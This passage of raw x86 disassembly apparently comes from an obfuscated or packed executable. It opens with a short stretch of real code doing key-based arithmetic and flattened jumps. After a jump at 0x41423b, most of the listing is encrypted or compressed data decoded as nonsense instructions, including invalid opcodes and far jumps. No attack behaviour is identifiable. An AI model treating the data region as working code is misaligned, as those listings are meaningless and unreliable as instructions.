  414135:	cmp    DWORD PTR ds:0x428000,0x5
  41413c:	jne    0x41414f
  414142:	mov    esi,DWORD PTR ds:0x428000
  414148:	dec    esi
  414149:	mov    DWORD PTR ds:0x428000,esi
  41414f:	mov    esi,DWORD PTR ds:0x428000
  414155:	dec    esi
  414156:	mov    DWORD PTR ds:0x428000,esi
  41415c:	jmp    0x4140f1
  414161:	add    eax,edx
  414163:	mov    DWORD PTR [ebp-0x18],eax
  414166:	mov    eax,DWORD PTR [ebp+0xc]
  414169:	mov    esi,DWORD PTR [ebp-0x8]
  41416c:	xor    eax,ecx
  41416e:	add    eax,edx
  414170:	imul   eax,DWORD PTR [esi]
  414173:	mov    esi,DWORD PTR [ebp+0x8]
  414176:	xor    esi,ecx
  414178:	add    esi,edx
  41417a:	cmp    esi,eax
  41417c:	mov    eax,DWORD PTR [ebp-0x4]
  41417f:	push   ebx
  414180:	je     0x41419f
  414186:	mov    esi,DWORD PTR [ebp-0x18]
  414189:	add    DWORD PTR [eax],esi
  41418b:	mov    eax,DWORD PTR [ebp-0x4]
  41418e:	mov    esi,DWORD PTR [ebp+0xc]
  414191:	xor    esi,ecx
  414193:	add    esi,edx
  414195:	imul   esi,DWORD PTR [eax]
  414198:	mov    DWORD PTR [eax],esi
  41419a:	jmp    0x4141a4
  41419f:	mov    esi,DWORD PTR [ebp+0x14]
  4141a2:	xor    DWORD PTR [eax],esi
  4141a4:	mov    eax,DWORD PTR [ebp-0x4]
  4141a7:	mov    edi,DWORD PTR [ebp+0x10]
  4141aa:	xor    edi,ecx
  4141ac:	mov    esi,0xffcd8d25
  4141b1:	mov    ebx,esi
  4141b3:	sub    ebx,edi
  4141b5:	add    DWORD PTR [eax],ebx
  4141b7:	mov    eax,DWORD PTR [ebp-0x4]
  4141ba:	mov    edi,DWORD PTR [ebp-0x8]
  4141bd:	add    edi,DWORD PTR [eax]
  4141bf:	mov    DWORD PTR [ebp-0x8],edi
  4141c2:	mov    eax,DWORD PTR [ebp+0xc]
  4141c5:	mov    edi,DWORD PTR [ebp+0xc]
  4141c8:	xor    edi,ecx
  4141ca:	xor    eax,ecx
  4141cc:	lea    eax,[eax+edi*1+0x64e5b6]
  4141d3:	mov    edi,DWORD PTR [ebp+0xc]
  4141d6:	xor    edi,ecx
  4141d8:	add    edi,edx
  4141da:	imul   eax,edi
  4141dd:	mov    edi,DWORD PTR [ebp+0xc]
  4141e0:	xor    edi,ecx
  4141e2:	sub    edi,eax
  4141e4:	mov    eax,DWORD PTR [ebp-0x4]
  4141e7:	add    edi,edx
  4141e9:	cmp    DWORD PTR [eax],edi
  4141eb:	mov    eax,DWORD PTR [ebp-0x4]
  4141ee:	mov    edi,DWORD PTR [ebp+0x10]
  4141f1:	jg     0x414204
  4141f7:	xor    edi,ecx
  4141f9:	mov    ebx,esi
  4141fb:	sub    ebx,edi
  4141fd:	add    DWORD PTR [eax],ebx
  4141ff:	jmp    0x41420a
  414204:	xor    edi,ecx
  414206:	add    edi,edx
  414208:	add    DWORD PTR [eax],edi
  41420a:	mov    eax,DWORD PTR [ebp-0x8]
  41420d:	mov    edi,DWORD PTR [ebp-0x10]
  414210:	mov    eax,DWORD PTR [eax]
  414212:	xor    edi,ecx
  414214:	add    edi,0x3272da
  41421a:	not    edi
  41421c:	and    eax,edi
  41421e:	movsx  di,BYTE PTR [eax+0x1]
  414223:	mov    ebx,0x3b4b
  414228:	sub    di,bx
  41422b:	mov    ebx,0x8a85
  414230:	xor    di,bx
  414233:	mov    ebx,0x4f8a
  414238:	cmp    di,bx
  41423b:	jmp    0x4165fa
  414240:	out    dx,al
  414241:	add    eax,0x6723a723
  414246:	outs   dx,BYTE PTR ds:[esi]
  414247:	sbb    DWORD PTR [edx+0x1b],0xf
  41424b:	hlt    
  41424c:	jae    0x414266
  41424e:	fsubp  st(6),st
  414250:	jge    0x414298
  414252:	popa   
  414253:	(bad)  
  414254:	rcr    BYTE PTR [edi+0x62],0x62
  414258:	daa    
  414259:	sbb    BYTE PTR [edx+0x452a12ff],cl
  41425f:	ja     0x414253
  414261:	xchg   esi,eax
  414262:	sar    DWORD PTR [eax-0x6fe5cb53],0xf3
  414269:	and    ah,BYTE PTR [edi*4+0xaad11c5]
  414270:	mov    al,0x9a
  414272:	xchg   ebp,eax
  414273:	sbb    DWORD PTR [eax-0x1f],0xffffff8b
  414277:	ins    BYTE PTR es:[edi],dx
  414278:	jb     0x414217
  41427a:	cdq    
  41427b:	cs inc ebx
  41427d:	out    0xce,al
  41427f:	loopne 0x4142e7
  414281:	xor    ebx,DWORD PTR [ecx]
  414283:	ret    0xc12d
  414286:	dec    esp
  414287:	pop    esi
  414288:	out    0xc5,eax
  41428a:	sbb    bl,bh
  41428c:	mov    bh,0x4d
  41428e:	adc    ecx,DWORD PTR [eax-0x56]
  414291:	and    DWORD PTR [eax+0x39032caf],0x82034e11
  41429b:	loope  0x4142aa
  41429d:	sbb    BYTE PTR [ebp+0x26],dh
  4142a0:	pop    esp
  4142a1:	pop    eax
  4142a2:	sub    ebx,esp
  4142a4:	dec    ebp
  4142a5:	xchg   DWORD PTR [ecx-0x55],ebp
  4142a8:	aad    0xf6
  4142aa:	(bad)  
  4142ab:	leave  
  4142ac:	sahf   
  4142ad:	pop    ds
  4142ae:	add    dl,BYTE PTR [esi]
  4142b0:	inc    edi
  4142b1:	push   edx
  4142b2:	xchg   DWORD PTR [edi+0x40],eax
  4142b5:	jp     0x4142a5
  4142b7:	cld    
  4142b8:	sub    esi,edx
  4142ba:	push   cs
  4142bb:	jb     0x414265
  4142bd:	int3   
  4142be:	(bad)  
  4142bf:	xor    eax,0x8ca59657
  4142c4:	and    eax,0x766aa3dd
  4142c9:	iret   
  4142ca:	push   ebx
  4142cb:	dec    edi
  4142cc:	cmp    al,0x71
  4142ce:	pop    ebx
  4142cf:	dec    edi
  4142d0:	data16 jae 0x414267
  4142d3:	jp     0x41431b
  4142d5:	sbb    al,BYTE PTR [ebx-0x13]
  4142d8:	fsub   QWORD PTR [eax]
  4142da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142db:	mov    bh,0x7f
  4142dd:	jmp    0x4508:0xa0580d68
  4142e4:	or     al,0xef
  4142e6:	jns    0x4142d4
  4142e8:	inc    esp
  4142e9:	add    DWORD PTR [ecx],edi
  4142eb:	mov    cs,ebp
  4142ed:	cdq    
  4142ee:	jle    0x4142f5
  4142f0:	ds adc ch,ah
  4142f3:	in     eax,dx
  4142f4:	aad    0x8
  4142f6:	pop    ss
  4142f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142f8:	add    eax,0x9974c96
  4142fd:	jmp    0x414287
  4142ff:	js     0x414365
  414301:	test   BYTE PTR [edx],al
  414303:	jl     0x4142c3
  414305:	adc    al,BYTE PTR [eax+0xbf650ad]
  41430b:	pushf  
  41430c:	mov    eax,ds:0xa3ebe79f
  414311:	mov    edi,0x1e3cae98
  414316:	xchg   edx,eax
  414317:	jo     0x41429f
  414319:	rcl    eax,cl
  41431b:	fst    QWORD PTR [eax]
  41431d:	sub    ch,BYTE PTR [esi]
  41431f:	imul   ecx,DWORD PTR [edi+0x68661174],0x4a
  414326:	and    dh,dh
  414328:	xor    eax,0xb1c4fde1
  41432d:	mov    ds:0xd00bd00d,al
  414332:	sar    BYTE PTR [eax+0x4f],1
  414335:	jg     0x4142ed
  414337:	mov    al,ds:0xe5849a0f
  41433c:	add    esp,DWORD PTR [edi]
  41433e:	jmp    0x69d5:0x2de68bbf
  414345:	inc    edi
  414346:	mov    ebx,DWORD PTR [ebx-0x21]
  414349:	and    ebp,DWORD PTR [ebp-0x38]
  41434c:	ja     0x414397
  41434e:	jmp    0xf47d:0xa2efd2cd
  414355:	lods   al,BYTE PTR ds:[esi]
  414356:	and    al,0x3d
  414358:	mov    edx,DWORD PTR [eax]
  41435a:	pop    ecx
  41435b:	out    0x88,eax
  41435d:	mov    esi,0xdcb03682
  414362:	je     0x4143bd
  414364:	xlat   BYTE PTR ds:[ebx]
  414365:	pop    ebx
  414366:	sbb    esp,DWORD PTR fs:[edi+0x64]
  41436a:	pop    DWORD PTR [ebx]
  41436c:	pop    edi
  41436d:	aam    0x23
  41436f:	jge    0x4143b0
  414371:	icebp  
  414372:	cmp    eax,0xf585ed9e
  414377:	lds    ebp,FWORD PTR [ebp-0x3aa42950]
  41437d:	cmc    
  41437e:	(bad)  
  41437f:	adc    eax,0x15745ea2
  414384:	mov    eax,0xd740b5d1
  414389:	jle    0x414395
  41438b:	in     eax,0xd7
  41438d:	jns    0x41438d
  41438f:	and    ah,BYTE PTR [ebp-0x70e77579]
  414395:	shl    BYTE PTR [ebp-0x3e],1
  414398:	ss cmp al,0xcc
  41439b:	das    
  41439c:	fwait
  41439d:	pop    ebp
  41439e:	xchg   edi,eax
  41439f:	scas   eax,DWORD PTR es:[edi]
  4143a0:	(bad)  
  4143a2:	lahf   
  4143a3:	or     al,0xbf
  4143a5:	repz shl ah,0x3e
  4143a9:	or     cl,BYTE PTR [edi+0xb249ff3]
  4143af:	rcl    ah,cl
  4143b1:	cmp    ah,bl
  4143b3:	into   
  4143b4:	imul   ecx,ebp,0x4a
  4143b7:	xlat   BYTE PTR ds:[ebx]
  4143b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143b9:	dec    esi
  4143ba:	call   0x29b8:0x4ce5a535
  4143c1:	push   eax
  4143c2:	ss test ch,ch
  4143c5:	fisubr WORD PTR [esp+eax*2]
  4143c8:	fst    DWORD PTR [edx-0xaa4ef92]
  4143ce:	mov    ah,0x8e
  4143d0:	mov    DWORD PTR cs:[eax+0x346fc51a],ebp
  4143d7:	out    dx,eax
  4143d8:	jecxz  0x414408
  4143da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143db:	pop    ecx
  4143dc:	pop    edi
  4143dd:	ret    0xe4bb
  4143e0:	and    BYTE PTR [ecx-0x5],0x3
  4143e4:	mov    eax,ds:0xdcbd3437
  4143e9:	dec    esi
  4143ea:	cmp    esp,DWORD PTR [eax-0x55]
  4143ed:	test   bl,al
  4143ef:	jp     0x41445b
  4143f1:	push   ebp
  4143f2:	fsub   QWORD PTR ds:0xe3944de3
  4143f8:	cmp    al,0x4f
  4143fa:	pop    ebp
  4143fb:	adc    BYTE PTR [ebx+0x18],bh
  4143fe:	or     dl,BYTE PTR [ecx]
  414400:	jl     0x4143c0
  414402:	fcom   QWORD PTR [esi+edx*2]
  414405:	pop    esp
  414406:	jbe    0x4143d6
  414408:	or     edi,0xfffffff2
  41440b:	es inc ebx
  41440d:	mov    ebx,0x8c6b94a3
  414412:	je     0x41447c
  414414:	fwait
  414415:	inc    ebx
  414416:	add    al,0x62
  414418:	dec    ecx
  414419:	jge    0x414474
  41441b:	add    ah,BYTE PTR [esi+ebp*2-0x42863230]
  414422:	or     ebx,DWORD PTR [si-0x53f4]
  414427:	sbb    DWORD PTR [ecx+0x4c7abb05],esi
  41442d:	and    bh,BYTE PTR [ecx-0x53]
  414430:	cmp    al,0x9c
  414432:	push   ecx
  414433:	push   ebp
  414434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414435:	or     BYTE PTR [esi-0x248f8907],0xd2
  41443c:	pop    esi
  41443d:	lds    esp,FWORD PTR [eax]
  41443f:	mov    bh,0x98
  414441:	adc    DWORD PTR [eax],0x4e2e3cec
  414447:	mov    bh,0x62
  414449:	int3   
  41444a:	and    DWORD PTR [bx+0x7f3d],esi
  41444f:	pop    esi
  414450:	(bad)  
  414451:	dec    ebp
  414452:	out    0x4d,eax
  414454:	inc    esp
  414455:	xchg   ebp,eax
  414456:	mov    bh,0xaa
  414458:	hlt    
  414459:	jbe    0x4143ed
  41445b:	or     BYTE PTR [edx+ecx*2-0x3e],0x7
  414460:	mov    al,0x4
  414462:	pop    eax
  414463:	mov    cl,0x36
  414465:	leave  
  414466:	push   ecx
  414467:	icebp  
  414468:	(bad)  
  414469:	sti    
  41446a:	enter  0xa976,0x90
  41446e:	imul   edi,DWORD PTR [ecx+0x73],0xffffffab
  414472:	cmp    eax,0x85ba61b6
  414477:	add    dh,cl
  414479:	syscall 
  41447b:	cmp    al,0x40
  41447d:	scas   al,BYTE PTR es:[edi]
  41447e:	xchg   ecx,eax
  41447f:	pop    ebp
  414480:	pop    ds
  414481:	jmp    0xa962:0x917d5cef
  414488:	(bad)  
  414489:	loope  0x4144ee
  41448b:	int3   
  41448c:	and    BYTE PTR [ecx+0x6c],bh
  41448f:	mov    edi,0x33bb8efd
  414494:	push   eax
  414495:	mov    esi,0x2646393c
  41449a:	fdiv   DWORD PTR [eax+0x363ffd92]
  4144a0:	mov    al,0xda
  4144a2:	inc    esp
  4144a3:	retf   0xc10
  4144a6:	xchg   ebx,eax
  4144a7:	ror    DWORD PTR [eax],1
  4144a9:	inc    edi
  4144aa:	call   0x881e3115
  4144af:	mov    al,ds:0x7330656
  4144b4:	rcr    DWORD PTR [eax],1
  4144b6:	sub    al,0x86
  4144b8:	xor    BYTE PTR [edx+0x72cea974],cl
  4144be:	(bad)  
  4144bf:	adc    DWORD PTR [esi],esi
  4144c1:	lock pop ecx
  4144c3:	xchg   ebx,eax
  4144c4:	shl    DWORD PTR [edx+0x64],0xed
  4144c8:	mov    dh,0x1d
  4144ca:	hlt    
  4144cb:	fidiv  DWORD PTR [esi+0x79]
  4144ce:	shr    BYTE PTR [ebp-0x7db63970],1
  4144d4:	cmc    
  4144d5:	sbb    BYTE PTR [ebx-0x1e],0x41
  4144d9:	lock mov es,WORD PTR [eax-0x2b]
  4144dd:	pop    ss
  4144de:	shl    DWORD PTR [edx-0x37019826],1
  4144e4:	test   DWORD PTR [edx],0xe1e76c37
  4144ea:	mov    al,ds:0x51a3239e
  4144ef:	in     eax,dx
  4144f0:	fs in  eax,dx
  4144f2:	jmp    0x4144da
  4144f4:	ins    DWORD PTR es:[edi],dx
  4144f5:	sbb    eax,DWORD PTR [ebx]
  4144f7:	cli    
  4144f8:	scas   al,BYTE PTR es:[edi]
  4144f9:	push   edx
  4144fa:	push   0x34df6499
  4144ff:	enter  0x9a0a,0x3f
  414503:	push   edx
  414504:	and    BYTE PTR [esp+edi*2],ch
  414507:	and    BYTE PTR [ecx+0x3fafa442],bh
  41450d:	mov    bl,0xa1
  41450f:	test   ebx,edi
  414511:	adc    al,0x78
  414513:	and    DWORD PTR [eax-0x32],0x31
  414517:	in     al,0x4e
  414519:	xor    eax,0xd717c70c
  41451e:	sbb    DWORD PTR [edx-0x7ed05001],ecx
  414524:	cli    
  414525:	mov    gs,ebp
  414527:	ror    cl,cl
  414529:	push   ebp
  41452a:	adc    ah,BYTE PTR cs:[ecx]
  41452d:	lahf   
  41452e:	and    bh,ah
  414530:	sub    DWORD PTR [ecx-0x7d923d8a],esp
  414536:	bound  esi,QWORD PTR [esi-0x76]
  414539:	or     ch,BYTE PTR ds:0x7c9185d6
  41453f:	mov    ds:0x6131b435,al
  414544:	add    esp,esi
  414546:	mov    eax,ds:0xf9dc2cbe
  41454b:	enter  0x6033,0xe
  41454f:	fisubr WORD PTR [edx-0x71]
  414552:	push   0xee32ec07
  414557:	(bad)  [esi+0x6e]
  41455a:	and    WORD PTR [ebx],0xff82
  41455e:	mov    ds:0xca2d3327,al
  414563:	push   ecx
  414564:	or     dl,0xd4
  414567:	in     al,0x98
  414569:	fistp  DWORD PTR [edi-0x2a]
  41456c:	fimul  WORD PTR [edx-0x47]
  41456f:	pop    es
  414570:	xchg   DWORD PTR [esi+ebx*1-0x6a],eax
  414574:	enter  0x8c0c,0xdf
  414578:	aam    0xe0
  41457a:	lahf   
  41457b:	(bad)  
  41457d:	sbb    esi,DWORD PTR [ecx+ebp*1-0x45]
  414581:	mov    bl,BYTE PTR [eax+0x4c6320f9]
  414587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414588:	ficom  WORD PTR [edx]
  41458a:	mov    al,0x4b
  41458c:	aad    0x32
  41458e:	out    0x25,eax
  414590:	push   es
  414591:	mov    ds:0x22e80d64,al
  414596:	mov    ecx,?
  414598:	pop    ebp
  414599:	mov    bh,0x7f
  41459b:	xchg   esp,eax
  41459c:	or     eax,eax
  41459e:	and    al,0xed
  4145a0:	push   eax
  4145a1:	xor    eax,0xe827656
  4145a6:	outs   dx,DWORD PTR ds:[esi]
  4145a7:	and    al,0xc7
  4145a9:	jmp    0x7f030317
  4145ae:	add    dh,0xb0
  4145b1:	mov    ss,WORD PTR [eax+eiz*8+0x1b9e0c2d]
  4145b8:	and    eax,0x242ac9a3
  4145bd:	lahf   
  4145be:	push   edx
  4145bf:	(bad)  
  4145c0:	and    al,0x99
  4145c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145c3:	sti    
  4145c4:	push   esp
  4145c5:	pop    edx
  4145c6:	and    eax,0x63648d14
  4145cb:	push   edi
  4145cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145ce:	mov    edx,0x86e09039
  4145d3:	inc    eax
  4145d4:	cld    
  4145d5:	rcr    BYTE PTR [ecx+0x6f],1
  4145d8:	sub    DWORD PTR [edi-0x26],eax
  4145db:	push   edx
  4145dc:	pop    edx
  4145dd:	ins    DWORD PTR es:[edi],dx
  4145de:	sbb    al,0x7a
  4145e0:	std    
  4145e1:	dec    edx
  4145e2:	gs jns 0x4145ab
  4145e5:	dec    ebx
  4145e6:	sub    eax,0xd9507394
  4145eb:	nop
  4145ec:	out    dx,al
  4145ed:	mov    ebp,0x94b86098
  4145f2:	(bad)  
  4145f3:	out    0x11,eax
  4145f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145f6:	pop    es
  4145f7:	add    eax,0x77654dd7
  4145fc:	push   edi
  4145fd:	ror    ebp,cl
  4145ff:	outs   dx,DWORD PTR ds:[esi]
  414600:	and    BYTE PTR [esi],0xb2
  414603:	(bad)  
  414604:	xor    eax,0x865c62b4
  414609:	push   ebp
  41460a:	in     al,dx
  41460b:	mov    al,0x10
  41460d:	push   ecx
  41460e:	fwait
  41460f:	into   
  414610:	repnz popa 
  414612:	mov    edx,0xbf62ed08
  414617:	and    eax,0xef17f06a
  41461c:	add    edi,ebx
  41461e:	mov    ds:0x2bb8250d,eax
  414623:	sti    
  414624:	retf   0xf1c9
  414627:	ds inc ecx
  414629:	push   ebp
  41462a:	shl    edi,cl
  41462c:	jp     0x4145da
  41462e:	out    dx,eax
  41462f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414630:	pushf  
  414631:	scas   eax,DWORD PTR es:[edi]
  414632:	std    
  414633:	fiadd  WORD PTR [ebx+0x1ea4ade9]
  414639:	(bad)  
  41463a:	popa   
  41463b:	push   edx
  41463c:	rcl    DWORD PTR [ecx+eax*1],0xa2
  414640:	push   ecx
  414641:	pop    edx
  414642:	in     eax,0x58
  414644:	or     DWORD PTR [ebp-0x16b66123],edx
  41464a:	popf   
  41464b:	add    dl,bl
  41464d:	sbb    BYTE PTR [ebx+0x30],al
  414650:	jl     0x4145d5
  414652:	jmp    0x23b8f17e
  414657:	ja     0x414684
  414659:	xor    bl,al
  41465b:	mov    BYTE PTR [ebx],dh
  41465d:	lock mov al,ds:0xe08805f9
  414663:	clc    
  414664:	aam    0x41
  414666:	push   edi
  414667:	imul   edi,DWORD PTR [eax+0x29c534fd],0x499c3688
  414671:	push   ds
  414672:	add    al,0xab
  414674:	jnp    0x4145fe
  414676:	fisubr WORD PTR [ecx+0x2def3333]
  41467c:	sub    ebp,ebx
  41467e:	xor    ecx,DWORD PTR [eax+0x18af3381]
  414684:	xchg   edx,eax
  414685:	bound  ebx,QWORD PTR [edx+0x3b]
  414688:	aas    
  414689:	mov    esi,0x1c1ad39d
  41468e:	dec    edx
  41468f:	xor    al,0x1c
  414691:	fwait
  414692:	ret    
  414693:	das    
  414694:	jle    0x4146ba
  414696:	icebp  
  414697:	(bad)  
  414698:	hlt    
  414699:	xor    eax,0x6859acce
  41469e:	das    
  41469f:	test   DWORD PTR [eax+0x7b9e98ec],0x9700b16a
  4146a9:	sub    bh,BYTE PTR [ebx+edx*8]
  4146ac:	rcr    DWORD PTR [ecx-0x7e],1
  4146af:	std    
  4146b0:	(bad)  
  4146b1:	and    eax,0xb8c5c7ef
  4146b6:	js     0x41465d
  4146b8:	retf   0xbf3c
  4146bb:	in     al,0xe4
  4146bd:	and    eax,0xc81579da
  4146c2:	push   cs
  4146c3:	inc    esp
  4146c4:	or     edi,0xdd07abd1
  4146ca:	cmp    DWORD PTR [ecx+edx*8+0x3c],0x5e
  4146cf:	adc    ebp,DWORD PTR [eax]
  4146d1:	shl    BYTE PTR [edi-0x7b46c614],cl
  4146d7:	sub    al,0x3d
  4146d9:	xlat   BYTE PTR ds:[ebx]
  4146da:	pop    ss
  4146db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146dc:	add    bl,BYTE PTR [esi]
  4146de:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4146e0:	loopne 0x414692
  4146e2:	cmp    eax,0xea9c60ce
  4146e7:	jb     0x414758
  4146e9:	add    eax,0x9f65b176
  4146ee:	dec    ebx
  4146ef:	loop   0x4146e2
  4146f1:	cmp    DWORD PTR [ebx+0x58f207e3],esi
  4146f7:	mov    edx,eax
  4146f9:	(bad)  
  4146fa:	data16 (bad) 
  4146fc:	mov    ecx,0x39f58792
  414701:	adc    dh,ch
  414703:	loop   0x414714
  414705:	fs jmp 0xb2d9:0xbf43eaf6
  41470d:	add    BYTE PTR [edx-0x6caf90c0],dl
  414713:	jb     0x4146bf
  414715:	push   edi
  414716:	sahf   
  414717:	stos   DWORD PTR es:[edi],eax
  414718:	scas   al,BYTE PTR es:[edi]
  414719:	cmp    al,0xfa
  41471b:	sub    al,bh
  41471d:	sbb    eax,0x13e96bd6
  414722:	add    esi,DWORD PTR [ebp-0x2afc242d]
  414728:	scas   eax,DWORD PTR es:[edi]
  414729:	cmp    dl,dl
  41472b:	lods   eax,DWORD PTR ds:[esi]
  41472c:	stos   DWORD PTR es:[edi],eax
  41472d:	mov    eax,ds:0x20ee6b45
  414732:	int    0x9f
  414734:	int    0x81
  414736:	and    ah,bh
  414738:	mov    ch,0xa3
  41473a:	enter  0xca4e,0xa7
  41473e:	xchg   ecx,eax
  41473f:	call   0xc42:0xb09ada2a
  414746:	popf   
  414747:	ja     0x414728
  414749:	or     DWORD PTR es:[edx],esp
  41474c:	shr    DWORD PTR ss:[ebp-0x9f211c0],cl
  414753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414754:	jle    0x414727
  414756:	mov    edi,0xe515c0f4
  41475b:	lahf   
  41475c:	in     eax,0x75
  41475e:	dec    edx
  41475f:	cmp    BYTE PTR [edi+0x2d],dl
  414762:	loope  0x4147bc
  414764:	dec    edx
  414765:	cmp    cl,ch
  414767:	mov    WORD PTR [esi],ss
  414769:	sub    al,0x7f
  41476b:	sub    al,0xa
  41476d:	retf   
  41476e:	pusha  
  41476f:	sbb    dl,0x64
  414772:	or     eax,eax
  414774:	lods   al,BYTE PTR ds:[esi]
  414775:	xor    ecx,DWORD PTR [edi+0x560298f5]
  41477b:	adc    eax,0xd419d5b
  414780:	int3   
  414781:	repnz inc ecx
  414783:	mov    al,0xbc
  414785:	ret    
  414786:	push   ds
  414787:	sahf   
  414788:	mov    gs,edx
  41478a:	in     eax,dx
  41478b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41478c:	cmc    
  41478d:	leave  
  41478e:	stc    
  41478f:	dec    ebx
  414790:	(bad)  
  414791:	jmp    0x85c486de
  414796:	inc    esp
  414797:	and    ah,BYTE PTR [edi]
  414799:	inc    esp
  41479a:	jmp    0x4147e9
  41479c:	mov    al,ds:0xd28eb54
  4147a1:	and    dh,BYTE PTR [ecx-0x4aa4589c]
  4147a7:	sbb    eax,0x332f72f5
  4147ac:	stos   DWORD PTR es:[edi],eax
  4147ad:	and    DWORD PTR [ebx-0x6a0e7f11],ebx
  4147b3:	pop    eax
  4147b4:	dec    ebp
  4147b5:	inc    ebp
  4147b6:	lock mov ?,eax
  4147b9:	mov    eax,0xba00af83
  4147be:	cmp    DWORD PTR [ebp+ebp*8-0x796e57fe],ebp
  4147c5:	jg     0x4147c4
  4147c7:	pop    ss
  4147c8:	ins    DWORD PTR es:[edi],dx
  4147c9:	icebp  
  4147ca:	lock mov BYTE PTR [edi-0x74],ah
  4147ce:	int3   
  4147cf:	arpl   sp,ax
  4147d1:	mov    edx,0x60739043
  4147d6:	loopne 0x414838
  4147d8:	jmp    0x57257ffc
  4147dd:	mov    al,ds:0x6af94e83
  4147e2:	es jmp 0x414768
  4147e5:	adc    ebx,DWORD PTR [ebp-0x529a3204]
  4147eb:	inc    eax
  4147ec:	jle    0x41480c
  4147ee:	adc    DWORD PTR [edi],ebp
  4147f0:	lahf   
  4147f1:	outs   dx,BYTE PTR ds:[esi]
  4147f2:	(bad)  [esi]
  4147f4:	xchg   esp,eax
  4147f5:	je     0x414859
  4147f7:	push   0xffffff96
  4147f9:	pop    ss
  4147fa:	scas   al,BYTE PTR es:[edi]
  4147fb:	pop    ebp
  4147fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147fd:	xchg   esi,eax
  4147fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147ff:	inc    esp
  414800:	test   eax,0xe7461d7a
  414805:	jecxz  0x4147b9
  414807:	xor    eax,0x1d6f7402
  41480c:	pop    esp
  41480d:	pop    ss
  41480e:	or     bh,BYTE PTR [edi-0x54]
  414811:	jle    0x41483c
  414813:	stos   BYTE PTR es:[edi],al
  414814:	jecxz  0x414853
  414816:	jns    0x414818
  414818:	jnp    0x41482b
  41481a:	lahf   
  41481b:	ss jo  0x41485c
  41481e:	(bad)  
  41481f:	(bad)  
  414820:	add    esp,DWORD PTR [eax+0x4381ea24]
  414826:	add    eax,0x855ca7a
  41482b:	add    edx,edx
  41482d:	cdq    
  41482e:	shl    BYTE PTR [eax+esi*4+0x6b],0x1f
  414833:	(bad)  
  414834:	aad    0x7f
  414836:	push   eax
  414837:	add    BYTE PTR [edi+edx*1],0xac
  41483b:	push   ecx
  41483c:	sti    
  41483d:	outs   dx,BYTE PTR ds:[esi]
  41483e:	cmp    al,BYTE PTR [esi]
  414840:	fstp   TBYTE PTR [ecx]
  414842:	daa    
  414843:	call   0xf164:0xd4d2b621
  41484a:	in     al,dx
  41484b:	ret    0x24eb
  41484e:	dec    edi
  41484f:	in     al,dx
  414850:	outs   dx,BYTE PTR ds:[esi]
  414851:	in     al,0x12
  414853:	and    eax,0x4b4decc
  414858:	les    esp,FWORD PTR [eax-0x57]
  41485b:	dec    edx
  41485c:	aas    
  41485d:	es jp  0x4148cf
  414860:	popf   
  414861:	dec    edi
  414862:	dec    edi
  414863:	xchg   DWORD PTR [edx+0x46e710ae],edx
  414869:	loop   0x4148a8
  41486b:	jge    0x4148da
  41486d:	sbb    edx,esi
  41486f:	sub    dl,BYTE PTR [edi+0x3c45ef57]
  414875:	mov    esi,0x96695273
  41487a:	pop    edx
  41487b:	std    
  41487c:	sbb    DWORD PTR [esi],0x622cd749
  414882:	arpl   WORD PTR [ebx+0x0],sp
  414885:	adc    DWORD PTR [ebx+edi*2],eax
  414888:	ficom  WORD PTR [ebx-0x4c67c5f1]
  41488e:	sbb    esp,DWORD PTR [ecx-0x33]
  414891:	sti    
  414892:	jmp    0x4148cf
  414894:	js     0x8322b567
  41489a:	jno    0x4148bb
  41489c:	repz add dl,ah
  41489f:	call   0x45e1:0xb0e116a5
  4148a6:	sbb    bl,BYTE PTR [edi+0x7ed16f41]
  4148ac:	push   0xf4332c8a
  4148b1:	popf   
  4148b2:	adc    eax,ecx
  4148b4:	sub    al,0x81
  4148b6:	inc    esp
  4148b7:	push   ss
  4148b8:	push   ds
  4148b9:	adc    al,0x23
  4148bb:	shl    DWORD PTR [eax+ecx*8+0x4ad9c5ef],1
  4148c2:	hlt    
  4148c3:	push   ss
  4148c4:	sbb    cl,dl
  4148c6:	push   ds
  4148c7:	push   esi
  4148c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148c9:	dec    DWORD PTR [ebp+edi*2+0x1684c2ed]
  4148d0:	adc    al,0x91
  4148d2:	mov    WORD PTR [esi-0x1fadd97],gs
  4148d8:	fs nop
  4148da:	addr16 jmp 0x8a74:0x76179ded
  4148e2:	pop    es
  4148e3:	shr    BYTE PTR [edx+0x7b222a66],cl
  4148e9:	je     0x414930
  4148eb:	sub    eax,edx
  4148ed:	push   ecx
  4148ee:	xchg   DWORD PTR [eax],esi
  4148f0:	repnz and eax,0x5516d812
  4148f6:	lock inc ebp
  4148f8:	push   0xfffffff8
  4148fa:	and    DWORD PTR [esi],0xfffffffb
  4148fd:	mov    cl,0x66
  4148ff:	or     esp,DWORD PTR [eax]
  414901:	ins    BYTE PTR es:[edi],dx
  414902:	jmp    0xcb5e:0x33f8c6ed
  414909:	(bad)  
  41490b:	xor    BYTE PTR [ecx+eax*1],al
  41490e:	pop    esp
  41490f:	fadd   DWORD PTR [ecx+0x70]
  414912:	addr16 xor eax,0xf8a70fba
  414918:	fwait
  414919:	jl     0x414968
  41491b:	sub    eax,0x7383431
  414920:	test   BYTE PTR [eax-0x202a28f9],bh
  414926:	loope  0x414991
  414928:	out    dx,al
  414929:	ds pop edx
  41492b:	xchg   ebx,ecx
  41492d:	and    bl,BYTE PTR [ebp-0x68]
  414930:	minps  xmm4,XMMWORD PTR [ebx+eiz*4]
  414934:	cmp    dl,BYTE PTR [esi]
